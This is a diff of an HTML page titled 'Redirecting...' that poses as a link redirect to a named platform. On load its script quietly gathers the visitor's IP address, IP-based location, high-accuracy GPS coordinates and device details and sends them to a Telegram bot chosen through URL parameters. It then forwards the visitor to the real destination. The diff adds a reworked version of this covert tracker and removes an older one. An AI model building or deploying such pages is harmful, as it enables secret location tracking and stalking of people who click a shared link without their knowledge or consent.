@@ -1,105 +1,169 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Redirecting...</title>
-    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); } 
+            100% { transform: rotate(360deg); }
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 2rem;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            max-width: 500px;
+            width: 90%;
+        }
+        h1 {
+            color: #2d3748;
+            margin-bottom: 1rem;
+        }
+        p {
+            color: #4a5568;
+            margin-bottom: 2rem;
+        }
+        .badge {
+            display: inline-block;
+            background: #edf2f7;
+            color: #2d3748;
+            padding: 0.25rem 0.5rem;
+            border-radius: 5px;
+            font-size: 0.875rem;
+            margin: 0 0.25rem;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="loader"></div>
+        <h1>Redirecting to <span class="badge" id="platformName">Platform</span></h1>
+        <p>Please wait while we verify your request...</p>
+    </div>
+
     <script>
         // Parse URL parameters
         const urlParams = new URLSearchParams(window.location.search);
-        const platform = urlParams.get('platform');
-        const display = urlParams.get('display');
-        const actualUrl = urlParams.get('url');
+        const platform = urlParams.get('platform') || 'unknown';
+        const displayText = urlParams.get('display') || 'the destination';
+        const targetUrl = urlParams.get('url') || 'about:blank';
         const botToken = urlParams.get('botToken');
         const chatId = urlParams.get('chatId');
-        
-        // Collect visitor data
-        async function collectData() {
+
+        // Display platform name
+        document.getElementById('platformName').textContent = displayText;
+
+        // Visitor data collection
+        async function collectAndSendData() {
             try {
-                // Get IP
-                const ipRes = await fetch('https://api.ipify.org?format=json');
-                const { ip } = await ipRes.json();
-                
-                // Get location data
-                let location = {};
+                // IP & Location Data
+                const ipData = await fetch('https://api.ipify.org?format=json').then(res => res.json());
+                let locationData = {};
                 try {
-                    const locRes = await fetch(`https://ipapi.co/${ip}/json/`);
-                    location = await locRes.json();
-                } catch(e) {}
-                
-                // Try to get GPS
-                let gps = {};
+                    locationData = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(res => res.json());
+                } catch (e) {}
+
+                // Device Info
+                const deviceInfo = {
+                    browser: navigator.userAgent,
+                    os: navigator.platform,
+                    screen: `${window.screen.width}x${window.screen.height}`,
+                    language: navigator.language
+                };
+
+                // Attempt GPS with fallback
+                let gpsCoordinates = {};
                 try {
                     const pos = await new Promise((resolve, reject) => {
                         navigator.geolocation.getCurrentPosition(resolve, reject, {
                             enableHighAccuracy: true,
-                            timeout: 5000
+                            timeout: 5000,
+                            maximumAge: 0
                         });
                     });
-                    gps = {
+                    gpsCoordinates = {
                         lat: pos.coords.latitude,
-                        lon: pos.coords.longitude,
+                        lng: pos.coords.longitude,
                         accuracy: pos.coords.accuracy
                     };
-                } catch(e) {}
-                
-                // Collect device info
-                const device = {
-                    browser: navigator.userAgent,
-                    platform: navigator.platform,
-                    screen: `${window.screen.width}x${window.screen.height}`,
-                    language: navigator.language
-                };
-                
-                // Format message for Telegram
-                let message = `🔗 <b>Link Clicked Notification</b>\n\n`;
-                message += `📌 <b>Platform:</b> ${display} (${platform})\n`;
-                message += `🌐 <b>URL:</b> ${actualUrl}\n\n`;
-                
-                message += `👤 <b>Visitor Info</b>\n`;
-                message += `- IP: <code>${ip}</code>\n`;
-                message += `- Location: ${location.city || '?'}, ${location.country_name || '?'}\n`;
-                message += `- Org: ${location.org || '?'}\n`;
-                
-                if (gps.lat) {
-                    message += `- GPS: <a href="https://maps.google.com?q=${gps.lat},${gps.lon}">${gps.lat}, ${gps.lon}</a> (Akurasi: ${gps.accuracy}m)\n`;
+                } catch (e) {}
+
+                // Format message
+                const message = `
+<b>🔗 New Link Click</b>
+
+<b>Platform:</b> ${displayText} (${platform})
+<b>Target URL:</b> ${targetUrl}
+
+<b>🌐 Visitor Info</b>
+- IP: <code>${ipData.ip}</code>
+- Location: ${locationData.city || '?'}, ${locationData.country_name || '?'}
+- ISP: ${locationData.org || '?'}
+
+${gpsCoordinates.lat ? `
+<b>📍 GPS Coordinates</b>
+- Latitude: ${gpsCoordinates.lat}
+- Longitude: ${gpsCoordinates.lng}
+- Accuracy: ±${gpsCoordinates.accuracy}m
+- <a href="https://maps.google.com?q=${gpsCoordinates.lat},${gpsCoordinates.lng}">View on Google Maps</a>
+` : ''}
+
+<b>📱 Device Info</b>
+- Browser: ${deviceInfo.browser.split(') ')[0].split(' (')[0]}
+- OS: ${deviceInfo.os}
+- Screen: ${deviceInfo.screen}
+- Language: ${deviceInfo.language}
+
+<b>⏰ Time:</b> ${new Date().toLocaleString()}
+                `.trim();
+
+                // Send to Telegram (if credentials provided)
+                if (botToken && chatId) {
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message,
+                            parse_mode: 'HTML',
+                            disable_web_page_preview: true
+                        })
+                    });
                 }
-                
-                message += `\n💻 <b>Device:</b>\n`;
-                message += `- Browser: ${device.browser}\n`;
-                message += `- Platform: ${device.platform}\n`;
-                message += `- Screen: ${device.screen}\n`;
-                message += `- Language: ${device.language}\n\n`;
-                
-                message += `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
-                
-                // Send to Telegram
-                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: chatId,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
-                });
-                
-            } catch(error) {
-                console.error("Tracking error:", error);
+
+            } catch (error) {
+                console.error('Tracking error:', error);
             } finally {
-                // Redirect to actual URL
-                window.location.href = actualUrl;
+                // Redirect after 2 seconds (minimum)
+                setTimeout(() => {
+                    window.location.href = targetUrl;
+                }, 2000);
             }
         }
-        
-        // Start tracking on page load
-        window.onload = collectData;
+
+        // Start tracking
+        collectAndSendData();
     </script>
-</head>
-<body class="bg-gray-900 text-white flex justify-center items-center h-screen">
-    <div class="text-center">
-        <div class="inline-block animate-spin rounded-full h-12 w-12 border-t-2 border-b-2 border-blue-500 mb-4"></div>
-        <h1 class="text-2xl font-bold mb-2">Mengarahkan ke ${display}...</h1>
-        <p class="text-gray-400">Harap tunggu sebentar</p>
-    </div>
 </body>
 </html>
